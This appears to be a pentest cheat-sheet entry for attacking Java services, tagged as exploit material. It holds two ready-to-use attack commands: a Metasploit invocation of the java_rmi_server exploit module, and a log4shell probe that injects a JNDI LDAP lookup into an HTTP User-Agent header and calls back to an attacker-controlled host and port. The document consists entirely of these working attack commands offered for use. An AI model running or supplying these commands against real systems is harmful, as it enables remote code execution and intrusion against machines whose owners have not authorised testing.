# Java

% java

## RMI
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT  
```
msfconsole -x "use exploit/multi/misc/java_rmi_server"
```

## log4shell find
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT  
```
curl -H 'User-Agent: ${jndi:ldap://<lhost>:<lport>}' <ip>
```
